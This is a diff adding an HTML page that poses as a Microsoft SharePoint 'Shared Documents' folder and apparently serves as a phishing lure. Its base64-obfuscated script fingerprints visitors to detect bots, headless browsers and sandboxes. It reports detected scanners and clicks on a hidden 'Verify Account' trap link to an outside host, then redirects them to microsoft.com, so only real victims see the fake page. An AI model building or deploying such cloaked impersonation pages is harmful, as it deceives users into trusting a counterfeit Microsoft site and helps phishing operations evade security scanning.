@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+  <title>Shared Files – SharePoint</title>
+  <meta name="application-name" content="SharePoint"/>
+  <meta property="og:site_name" content="Microsoft"/>
+  <meta name="theme-color" content="#0078d4"/>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect x='0' y='0' width='9.5' height='9.5' fill='%23f25022'/%3E%3Crect x='11.5' y='0' width='9.5' height='9.5' fill='%237fba00'/%3E%3Crect x='0' y='11.5' width='9.5' height='9.5' fill='%2300a4ef'/%3E%3Crect x='11.5' y='11.5' width='9.5' height='9.5' fill='%23ffb900'/%3E%3C/svg%3E"/>
+  <link rel="shortcut icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 21 21'%3E%3Crect x='0' y='0' width='9.5' height='9.5' fill='%23f25022'/%3E%3Crect x='11.5' y='0' width='9.5' height='9.5' fill='%237fba00'/%3E%3Crect x='0' y='11.5' width='9.5' height='9.5' fill='%2300a4ef'/%3E%3Crect x='11.5' y='11.5' width='9.5' height='9.5' fill='%23ffb900'/%3E%3C/svg%3E"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    body{font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;background:linear-gradient(150deg,#e6eff9 0%,#d8e8f5 45%,#e4ecf8 100%);min-height:100vh;color:#1a1918;}
+    #_ld{position:fixed;inset:0;background:linear-gradient(150deg,#e6eff9,#d8e8f5);display:flex;align-items:center;justify-content:center;z-index:100;}
+    .ld-spin{width:36px;height:36px;border:3px solid rgba(0,120,212,.18);border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;}
+    @keyframes spin{to{transform:rotate(360deg);}}
+    #_mc{width:100%;}
+    .topbar{background:linear-gradient(135deg,#0078d4,#005a9e);height:50px;padding:0 28px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 10px rgba(0,0,0,.18);}
+    .topbar-name{color:#fff;font-size:15px;font-weight:600;letter-spacing:-.1px;}
+    .topbar-div{width:1px;height:20px;background:rgba(255,255,255,.25);margin:0 6px;}
+    .topbar-path{color:rgba(255,255,255,.78);font-size:13px;}
+    .wrap{max-width:860px;margin:0 auto;padding:26px 20px 48px;}
+    .ok-banner{background:linear-gradient(145deg,#0c9b12,#075907);border-radius:12px;padding:20px 22px;margin-bottom:22px;display:flex;align-items:center;gap:16px;box-shadow:0 4px 20px rgba(7,89,7,.22);position:relative;overflow:hidden;}
+    .ok-banner::before{content:'';position:absolute;top:-35px;right:-35px;width:130px;height:130px;border-radius:50%;background:rgba(255,255,255,.07);}
+    .ok-banner::after{content:'';position:absolute;bottom:-25px;left:-20px;width:90px;height:90px;border-radius:50%;background:rgba(255,255,255,.05);}
+    .ok-check{width:48px;height:48px;border-radius:50%;background:rgba(255,255,255,.2);border:2.5px solid rgba(255,255,255,.55);display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+    .ok-title{font-size:17px;font-weight:800;color:#fff;margin-bottom:4px;}
+    .ok-sub{font-size:13px;color:rgba(255,255,255,.82);line-height:1.5;}
+    .card{background:#fff;border-radius:12px;border:1px solid #d8e0ea;box-shadow:0 4px 12px rgba(0,0,0,.06),0 20px 60px rgba(0,0,0,.11);overflow:hidden;}
+    .card-hdr{padding:16px 20px;background:#f9f8f7;border-bottom:1px solid #ece9e7;display:flex;align-items:center;gap:14px;}
+    .folder-ico{width:44px;height:44px;background:linear-gradient(135deg,#0078d4,#005a9e);border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0;box-shadow:0 3px 10px #0078d445;}
+    .folder-name{font-size:17px;font-weight:700;color:#1a1918;}
+    .folder-meta{font-size:12px;color:#8a8886;margin-top:2px;}
+    .tbar{padding:10px 20px;border-bottom:1px solid #f3f2f1;display:flex;gap:8px;}
+    .tbtn{padding:6px 15px;border-radius:5px;font-size:13px;font-weight:600;border:1.5px solid;cursor:pointer;font-family:inherit;transition:filter .12s;}
+    .tbtn:hover{filter:brightness(.92);}
+    .tbtn-p{background:linear-gradient(135deg,#0078d4,#005a9e);color:#fff;border-color:#0078d4;}
+    .tbtn-g{background:#fff;color:#1a1918;border-color:#d2d0ce;}
+    .file-list{padding:6px 0;}
+    .frow{display:flex;align-items:center;gap:14px;padding:11px 20px;border-bottom:1px solid #f5f4f3;}
+    .frow:last-child{border-bottom:none;}
+    .frow:hover{background:#f9f8f7;}
+    .ficon{width:40px;height:40px;border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+    .finfo{flex:1;min-width:0;}
+    .fname{font-size:14px;font-weight:600;color:#1a1918;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+    .fmeta{font-size:11px;color:#8a8886;margin-top:3px;}
+    .ftag{font-size:10px;font-weight:700;padding:3px 9px;border-radius:20px;white-space:nowrap;flex-shrink:0;background:#edfaee;color:#107c41;border:1px solid #a8e6aa;}
+    .ftime{font-size:11px;color:#8a8886;white-space:nowrap;flex-shrink:0;}
+    footer{text-align:center;font-size:11px;color:#a5a5a5;padding:20px 16px 0;}
+    @media(max-width:560px){.wrap{padding:18px 12px 36px;}.ok-banner{padding:16px;}.topbar{padding:0 16px;}}
+  </style>
+</head>
+<body>
+<noscript><meta http-equiv="refresh" content="0;url=https://www.microsoft.com"/></noscript>
+<div id="_ld"><div class="ld-spin"></div></div>
+<div id="_mc" style="display:none;">
+  <div class="topbar">
+    <svg width="18" height="18" viewBox="0 0 21 21" style="flex-shrink:0;"><rect x="0" y="0" width="9.5" height="9.5" fill="#f25022"/><rect x="11.5" y="0" width="9.5" height="9.5" fill="#7fba00"/><rect x="0" y="11.5" width="9.5" height="9.5" fill="#00a4ef"/><rect x="11.5" y="11.5" width="9.5" height="9.5" fill="#ffb900"/></svg>
+    <span class="topbar-name">SharePoint</span>
+    <div class="topbar-div"></div>
+    <span class="topbar-path">Shared Documents</span>
+  </div>
+  <div class="wrap">
+    <div class="ok-banner">
+      <div class="ok-check">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </div>
+      <div style="position:relative;z-index:1;">
+        <div class="ok-title">Access Granted</div>
+        <div class="ok-sub">You now have access to this shared folder. The files below are ready to view.</div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-hdr">
+        <div class="folder-ico">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><path d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V7z" stroke="#fff" stroke-width="1.8" stroke-linejoin="round"/></svg>
+        </div>
+        <div>
+          <div class="folder-name">Shared Documents</div>
+          <div class="folder-meta">5 items &middot; Shared with you &middot; View only</div>
+        </div>
+      </div>
+      <div class="tbar">
+        <button type="button" class="tbtn tbtn-p">+ New</button>
+        <button type="button" class="tbtn tbtn-g">&#8593; Upload</button>
+        <button type="button" class="tbtn tbtn-g">&#10150; Share</button>
+      </div>
+      <div class="file-list"><div class="frow"><div class="ficon" style="background:#107c41;"><svg width="22" height="22" viewBox="0 0 36 36"><text x="18" y="18" dominant-baseline="middle" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="10" font-weight="800" fill="white">XLS</text></svg></div><div class="finfo"><div class="fname">Q1 Report Final.xlsx</div><div class="fmeta">Excel Spreadsheet &middot; Shared for viewing</div></div><span class="ftime">Just now</span><span class="ftag">&#10003; Shared</span></div><div class="frow"><div class="ficon" style="background:#185abd;"><svg width="22" height="22" viewBox="0 0 36 36"><text x="18" y="18" dominant-baseline="middle" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="18" font-weight="800" fill="white">W</text></svg></div><div class="finfo"><div class="fname">Project Overview.docx</div><div class="fmeta">Word Document &middot; Shared for viewing</div></div><span class="ftime">Just now</span><span class="ftag">&#10003; Shared</span></div><div class="frow"><div class="ficon" style="background:#d35230;"><svg width="22" height="22" viewBox="0 0 36 36"><text x="18" y="18" dominant-baseline="middle" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="18" font-weight="800" fill="white">P</text></svg></div><div class="finfo"><div class="fname">Presentation.pptx</div><div class="fmeta">PowerPoint Presentation &middot; Shared for viewing</div></div><span class="ftime">Just now</span><span class="ftag">&#10003; Shared</span></div><div class="frow"><div class="ficon" style="background:#107c41;"><svg width="22" height="22" viewBox="0 0 36 36"><text x="18" y="18" dominant-baseline="middle" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="10" font-weight="800" fill="white">XLS</text></svg></div><div class="finfo"><div class="fname">Budget 2026.xlsx</div><div class="fmeta">Excel Spreadsheet &middot; Shared for viewing</div></div><span class="ftime">Just now</span><span class="ftag">&#10003; Shared</span></div><div class="frow"><div class="ficon" style="background:#185abd;"><svg width="22" height="22" viewBox="0 0 36 36"><text x="18" y="18" dominant-baseline="middle" text-anchor="middle" font-family="Arial,Helvetica,sans-serif" font-size="18" font-weight="800" fill="white">W</text></svg></div><div class="finfo"><div class="fname">Meeting Notes.docx</div><div class="fmeta">Word Document &middot; Shared for viewing</div></div><span class="ftime">Just now</span><span class="ftag">&#10003; Shared</span></div></div>
+    </div>
+    <footer>Microsoft SharePoint &middot; microsoft.com &middot; &copy; Microsoft Corporation</footer>
+  </div>
+</div>
+<script>(function(){
+var _a=function(s){return atob(s);};
+var _b=navigator,_c=window,_d=document,_w=screen;
+var _t=false;
+if(_b[_a('d2ViZHJpdmVy')]===true)_t=true;
+if(_c[_a('Y2FsbFBoYW50b20=')]||_c[_a('X3BoYW50b20=')])_t=true;
+if(_c[_a('X19uaWdodG1hcmU=')])_t=true;
+if(_d.documentElement.getAttribute(_a('d2ViZHJpdmVy')))_t=true;
+if(_w.width<100||_w.height<100)_t=true;
+if(_b[_a('bGFuZ3VhZ2Vz')]&&_b[_a('bGFuZ3VhZ2Vz')].length===0)_t=true;
+var _isMob=/Mobi|Android|iPhone|iPad|iPod/i.test(_b.userAgent);
+if(!_isMob&&(!_b[_a('cGx1Z2lucw==')]||_b[_a('cGx1Z2lucw==')].length===0))_t=true;
+if(_w.colorDepth<16)_t=true;
+try{
+  var _cv=_d.createElement('canvas');
+  var _gl=_cv.getContext('webgl')||_cv.getContext('experimental-webgl');
+  if(_gl){
+    var _di=_gl.getExtension('WEBGL_debug_renderer_info');
+    if(_di){
+      var _rv=_gl.getParameter(_di.UNMASKED_RENDERER_WEBGL)||'';
+      if(_rv.indexOf(_a('U3dpZnRTaGFkZXI='))>-1||_rv.indexOf(_a('TWVzYQ=='))>-1)_t=true;
+    }
+  }
+}catch(_e2){}
+if(_c.self!==_c.top)_t=true;
+if(_t){try{navigator.sendBeacon(atob('aHR0cHM6Ly96ZW5ncmlkLnNwYWNlL2Nvbm5lY3QvcGFnZS9Pa0FEVGcxMGFtQVdfOWVkclVkZmI3LU9PaFE5UW5sVS9ib3Q='),'');}catch(_eb){}_c.location.replace(_a('aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbQ=='));return;}
+_c._lt=Date.now();
+_c._hg=false;
+var _mh=function(){_c._hg=true;_d.removeEventListener('mousemove',_mh);_d.removeEventListener('touchstart',_mh);};
+_d.addEventListener('mousemove',_mh);
+_d.addEventListener('touchstart',_mh);
+var _mc=_d.getElementById('_mc');
+var _ld=_d.getElementById('_ld');
+if(_mc)_mc.style.display='none';
+setTimeout(function(){
+  if(_mc){
+    _mc.style.opacity='0';
+    _mc.style.transition='opacity 0.4s ease';
+    _mc.style.display='block';
+    setTimeout(function(){_mc.style.opacity='1';},20);
+  }
+  if(_ld)_ld.style.display='none';
+},1400+Math.random()*600);
+var _hp=_d.createElement('div');
+_hp.style.cssText='position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:auto;';
+var _ha=_d.createElement('a');_ha.href='#verify';_ha.textContent='Verify Account';
+_ha.onclick=function(ev){ev.preventDefault();try{navigator.sendBeacon(atob('aHR0cHM6Ly96ZW5ncmlkLnNwYWNlL2Nvbm5lY3QvcGFnZS9Pa0FEVGcxMGFtQVdfOWVkclVkZmI3LU9PaFE5UW5sVS9ib3Q='),'');}catch(_eb){}_c.location.replace(_a('aHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbQ=='));};
+_hp.appendChild(_ha);
+var _fn=function(){if(_d.body){_d.body.appendChild(_hp);}else{setTimeout(_fn,100);}};_fn();
+})();</script>
+</body>
+</html>
